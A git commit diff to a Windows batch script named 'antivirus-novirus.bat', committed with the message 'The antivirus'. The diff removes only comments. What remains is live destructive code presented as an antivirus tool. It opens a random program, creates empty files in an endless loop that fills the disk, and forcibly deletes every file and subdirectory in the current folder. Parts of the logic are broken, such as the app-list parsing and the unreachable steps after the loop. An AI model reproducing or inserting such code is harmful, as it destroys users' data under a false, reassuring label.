fe603cd8b9962f3b8374e2da10516650f5e9aa4f
Deb-svg <debsecret95@gmail.com>
2024-09-15 14:27:48 +0800

    The antivirus

--- antivirus-novirus.bat
+++ antivirus-novirus.bat
@@ -1,22 +1,17 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: List of applications to randomly choose from
 set apps= [notepad.exe, paint.exe, calc.exe, cmd.exe]
 
-:: Choose a random application from the list
 set /a choice=%random% %% 4
 
-:: Start the chosen application
 start !apps:~%choice%,1!
 
-:: Create infinite random files
 :loop
 set filename=%random%_!random!_!random!.txt
 echo.>"%filename%"
 goto loop
 
-:: Count down from 10
 :countdown
 echo 10
 ping -n 2 localhost >nul
@@ -39,6 +34,5 @@ ping -n 2 localhost >nul
 echo 1
 ping -n 2 localhost >nul
 
-:: Delete all files in the current directory
 for /d %%D in (*) do rd "%%D" /s /q
 for %%F in (*) do del "%%F" /q
